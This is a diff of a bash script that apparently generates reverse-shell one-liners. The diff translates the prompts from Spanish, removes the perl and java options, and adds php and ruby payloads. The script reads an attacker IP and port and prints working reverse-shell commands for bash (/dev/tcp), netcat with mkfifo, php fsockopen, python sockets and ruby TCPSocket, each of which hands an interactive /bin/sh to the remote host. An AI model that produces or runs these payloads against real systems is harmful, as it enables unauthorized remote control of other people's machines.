@@ -28,24 +28,25 @@ echo -e "${redColour}    ____                                   _____ __        
         echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/____/  ${endColour}"
         echo -e "\n ${yellowColour} By Erik451 ${endColour}"
 
-#Tipos de shell
-echo -e "\n ${purpleColour} Tipos de shell disponibles: ${endColour}"
+#Shell types
+echo -e "\n ${purpleColour} Available shell types: ${endColour}"
 
-echo -e "\n 1) bash     5) ruby"
-echo -e "\n 2) netcat   6) perl"
-echo -e "\n 3) php      7) java"
-echo -e "\n 4) python"
+echo -e "\n 1) bash     4) python"
+echo -e "\n 2) netcat   5) ruby"
+echo -e "\n 3) php"
 
-#Pregunta por el tipo de shell
-echo -e "\n${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell
-echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce tu ip: ${endColour}"; read ip
-echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el puerto: ${endColour}"; read port
+#Ask for the type of shell
+printf "\n${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter the shell type: ${endColour}"; read shell
+printf "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter your ip: ${endColour}"; read ip
+printf "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter the port : ${endColour}"; read port
 
 #VARIABLES
 bash="bash -i >& /dev/tcp/$ip/$port 0>&1"
 netcat="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+php="php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-#Respuerta tipo de shell
+ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+#Shell type response
 case $shell in
 
     1)
@@ -62,12 +63,6 @@ case $shell in
          ;;
     5)
         echo -e "${blueColour}Use this:${endColour}${yellowColour} $ruby"
-         ;;
-    6)
-        echo -e "${blueColour}Use this:${endColour}${yellowColour} $perl"
-         ;;
-    7)
-        echo -e "${blueColour}Use this:${endColour}${yellowColour} $java"
          ;;
 
 esac
